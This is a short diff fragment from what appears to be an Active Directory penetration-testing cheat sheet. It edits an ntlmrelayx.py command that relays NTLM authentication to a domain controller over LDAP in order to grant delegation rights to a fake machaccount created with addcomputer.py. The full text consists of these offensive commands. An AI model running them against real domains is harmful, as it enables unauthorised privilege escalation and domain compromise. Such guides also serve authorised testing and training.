@@ -938,7 +938,7 @@ python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<U
 
 #### start NTLMRelay
 ```
-sudo ntlmrelayx.py -t ldaps://<DC IP> --http-port 8080 --delegate-access --escalate-user FAKE01$
+sudo ntlmrelayx.py -t ldap://<DC IP> --http-port 8080 --delegate-access --escalate-user FAKE01$
 ```
 
 #### Trigger target to authenticate to attacker machine
